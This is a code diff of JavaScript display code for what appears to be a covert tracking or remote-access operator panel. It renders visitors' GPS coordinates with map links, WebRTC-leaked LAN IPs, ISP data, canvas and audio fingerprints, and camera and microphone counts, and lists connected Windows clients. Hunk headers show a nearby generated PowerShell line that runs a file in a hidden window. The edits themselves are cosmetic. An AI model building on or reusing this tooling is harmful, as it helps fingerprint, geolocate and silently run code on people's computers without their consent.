@@ -1009,7 +1009,7 @@ const RunApp = (() => {
         const displayUsername = getDisplayUsername(user.username);
         const versionAttr = user.version ? ` title="${user.version}"` : '';
         const ipAttr = user.ip ? ` title="IP: ${escapeHtml(user.ip)}"` : ' title="IP: Unknown"';
-        const winLogoHtml = `<i class="bi bi-windows os-logo"${ipAttr} aria-hidden="true" style="cursor:help;"></i>`;
+        const winLogoHtml = `<i class="bi bi-windows os-logo"${ipAttr} aria-hidden="true"></i>`;
 
         return `
             <div class="card-header">
@@ -3847,6 +3847,14 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             const mapsUrl = hasGps ? `https://www.google.com/maps?q=${log.latitude},${log.longitude}` : (detailsObj.mapsUrl || null);
             const localTimeStr = formatLocalDateTime(log.created_at);
 
+            // Format GPS string cleanly without duplicate accuracy
+            let gpsDisplay = '';
+            if (hasGps) {
+                const accVal = log.accuracy ? Math.round(log.accuracy) : null;
+                const accStr = accVal !== null ? ` (±${accVal}m)` : '';
+                gpsDisplay = `${Number(log.latitude).toFixed(5)}, ${Number(log.longitude).toFixed(5)}${accStr}`;
+            }
+
             // Determine appropriate device/OS icon
             let deviceIcon = 'laptop';
             const osLower = (log.os || '').toLowerCase();
@@ -3874,6 +3882,19 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             const lanIp = (detailsObj.webrtcIps && detailsObj.webrtcIps.length > 0) ? detailsObj.webrtcIps[0] : '';
             const modelName = detailsObj.clientHints?.model || '';
             const asStr = detailsObj.as ? detailsObj.as.split(' ')[0] : '';
+            const asClean = detailsObj.as ? detailsObj.as.split(' ')[0] : '-';
+            const orgDisplay = (detailsObj.org && detailsObj.org !== log.isp) ? detailsObj.org : (log.isp || '-');
+
+            // Format audio pipeline info cleanly
+            let audioDisplay = '-';
+            if (detailsObj.audio && typeof detailsObj.audio === 'object') {
+                const sRate = detailsObj.audioSampleRate || detailsObj.audio.sampleRate;
+                const ch = detailsObj.audio.maxChannelCount;
+                const st = detailsObj.audio.state;
+                audioDisplay = `${sRate ? `${sRate} Hz` : ''}${ch ? ` · ${ch}ch` : ''}${st ? ` (${st})` : ''}`.trim() || 'Available';
+            } else if (detailsObj.audioSampleRate) {
+                audioDisplay = `${detailsObj.audioSampleRate} Hz`;
+            }
 
             return `
                 <div class="access-log-entry" id="log-card-${log.id}">
@@ -3899,25 +3920,25 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                         </div>
                     </div>
 
-                    <!-- Geo & Connectivity Strip -->
-                    <div class="access-log-geo-strip">
-                        <div class="access-log-geo-left">
-                            <i class="bi bi-geo-alt-fill access-log-geo-icon"></i>
-                            <span class="access-log-geo-location">${escapeHtml(locationStr)}</span>
-                            ${log.isp && log.isp !== 'Unknown' ? `<span class="access-log-geo-isp">• ${escapeHtml(log.isp)}</span>` : ''}
-                            ${asStr ? `<span class="access-log-geo-as">• ${escapeHtml(asStr)}</span>` : ''}
-                        </div>
-                        ${hasGps ? `
-                        <div class="access-log-geo-right">
-                            <span class="access-log-gps-mini" title="Accuracy: ±${Math.round(log.accuracy || 0)}m">
-                                <i class="bi bi-crosshair"></i> GPS ${escapeHtml(log.gps_location || `${log.latitude.toFixed(4)}, ${log.longitude.toFixed(4)}`)} (±${Math.round(log.accuracy || 0)}m)
-                            </span>
-                            <a class="access-log-maps-mini-btn" href="${mapsUrl}" target="_blank" rel="noreferrer" title="Open GPS location in Google Maps">
-                                <i class="bi bi-geo-alt"></i> Map
-                            </a>
-                        </div>
-                        ` : ''}
+                    <!-- Geo & ISP Row -->
+                    <div class="access-log-location-row">
+                        <i class="bi bi-geo-alt-fill access-log-geo-icon"></i>
+                        <span class="access-log-geo-location">${escapeHtml(locationStr)}</span>
+                        ${log.isp && log.isp !== 'Unknown' ? `<span class="access-log-geo-isp">• ${escapeHtml(log.isp)}</span>` : ''}
+                        ${asStr ? `<span class="access-log-geo-as">• ${escapeHtml(asStr)}</span>` : ''}
                     </div>
+
+                    ${hasGps ? `
+                    <!-- Verified High-Accuracy GPS Row -->
+                    <div class="access-log-gps-row">
+                        <span class="access-log-gps-badge" title="High-accuracy GPS sensor coordinates">
+                            <i class="bi bi-crosshair"></i> GPS: ${escapeHtml(gpsDisplay)}
+                        </span>
+                        <a class="access-log-maps-btn" href="${mapsUrl}" target="_blank" rel="noreferrer" title="Open GPS Location in Google Maps">
+                            <i class="bi bi-geo-alt-fill"></i> View Map
+                        </a>
+                    </div>
+                    ` : ''}
 
                     <!-- Quick-Scan Pills Row -->
                     <div class="access-log-pills-row">
@@ -3963,9 +3984,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                             <!-- Col 2: Network & Carrier Intelligence -->
                             <div class="access-log-deep-col">
                                 <div class="access-log-deep-header"><i class="bi bi-diagram-3"></i> Network & Carrier</div>
-                                <div class="access-log-deep-row"><span>ISP:</span> <code>${escapeHtml(log.isp || '-')}</code></div>
-                                <div class="access-log-deep-row"><span>Autonomous System:</span> <code>${escapeHtml(detailsObj.as || '-')}</code></div>
-                                <div class="access-log-deep-row"><span>Organization:</span> <code>${escapeHtml(detailsObj.org || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>ISP:</span> <code title="${escapeHtml(log.isp || '')}">${escapeHtml(log.isp || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Autonomous System:</span> <code title="${escapeHtml(detailsObj.as || '')}">${escapeHtml(asClean)}</code></div>
+                                <div class="access-log-deep-row"><span>Organization:</span> <code title="${escapeHtml(orgDisplay)}">${escapeHtml(orgDisplay)}</code></div>
                                 <div class="access-log-deep-row"><span>Downlink / RTT:</span> <code>${detailsObj.connection ? `${escapeHtml(detailsObj.connection.effectiveType || '')} ${escapeHtml(detailsObj.connection.downlink || '')} (${escapeHtml(detailsObj.connection.rtt || '-')})` : '-'}</code></div>
                                 <div class="access-log-deep-row"><span>Discovered LAN IPs:</span> <code>${detailsObj.webrtcIps && detailsObj.webrtcIps.length ? escapeHtml(detailsObj.webrtcIps.join(', ')) : 'None'}</code></div>
                                 <div class="access-log-deep-row"><span>Net Type:</span> <code>${escapeHtml(netTypeLabel)}</code></div>
@@ -3976,7 +3997,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                                 <div class="access-log-deep-header"><i class="bi bi-shield-lock"></i> Environment & Audio</div>
                                 <div class="access-log-deep-row"><span>Timezone:</span> <code>${escapeHtml(log.timezone || '-')}</code></div>
                                 <div class="access-log-deep-row"><span>Languages:</span> <code>${escapeHtml(log.language || '-')}</code></div>
-                                <div class="access-log-deep-row"><span>Audio Pipeline:</span> <code>${detailsObj.audioSampleRate ? `${detailsObj.audioSampleRate} Hz` : '-'}${detailsObj.audio ? ` (ID: ${String(detailsObj.audio).slice(0, 10)})` : ''}</code></div>
+                                <div class="access-log-deep-row"><span>Audio Pipeline:</span> <code>${escapeHtml(audioDisplay)}</code></div>
                                 <div class="access-log-deep-row"><span>Canvas Hash:</span> <code>${detailsObj.canvasHash ? escapeHtml(String(detailsObj.canvasHash).slice(0, 12)) : '-'}</code></div>
                                 <div class="access-log-deep-row"><span>Media Hardware:</span> <code>${detailsObj.media ? `${detailsObj.media.cameras} Cams, ${detailsObj.media.microphones} Mics` : '-'}</code></div>
                                 <div class="access-log-deep-row"><span>Cookies / DNT:</span> <code>${detailsObj.cookieEnabled ? 'Cookies On' : 'No Cookies'} · DNT: ${escapeHtml(String(detailsObj.doNotTrack ?? 'off'))}</code></div>
